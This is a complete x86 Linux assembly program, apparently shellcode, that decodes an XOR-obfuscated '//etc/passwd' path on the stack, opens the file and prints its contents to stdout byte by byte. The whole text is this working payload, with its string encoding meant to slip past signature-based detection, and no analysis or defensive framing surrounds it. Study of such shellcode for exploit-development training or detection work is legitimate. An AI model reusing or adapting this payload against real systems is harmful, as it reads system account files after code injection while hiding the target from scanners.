section .text

global _start

_start:

push 0xbadacd9c ; //etc/passwd (XOR encoded)
push 0xbfdd918c
push 0xaac891c0

xor ecx, ecx
mov cl, 3
mov edx, esp

decode:

mov eax, dword [edx]
xor eax, 0xdeadbeef		; XOR key
mov dword [edx], eax
add edx, 0x4
loop decode

xor eax, eax			; eax = 0
cdq						; edx = 0
mov byte [esp+12], al	; null terminate string "//etc/passwd"
mov al, 0x5				; sys_open
mov ebx, esp			; const char *pathname
xor ecx, ecx			; int flags
int 0x80

read:

mov ecx, esp			; void *buf
push eax				; save fd value for next byte read loop
mov ebx, eax			; int fd
xor eax, eax			; eax = 0
mov dl, 0x1				; size_t count = 1, we're reading a single byte at a time
mov al, 0x3				; sys_read
int 0x80

cdq						; edx = 0
cmp edx, eax			; check if we have any bytes left to read
je exit					; if not, exit

mov eax, edx			; eax = 0
mov ebx, eax			; ebx = 0
mov al, 0x4				; sys_write
mov bl, 0x1				; int fd = 1 (stdout)
mov dl, 0x1				; size_t count = 1, we're writing a single byte at a time
int 0x80

pop eax					; restore fd value
jmp read				; loop to next byte

exit:

mov eax, edx			; eax = 0
inc eax					; eax = 1, sys_exit
xor ebx, ebx			; ebx = 0, int status
int 0x80

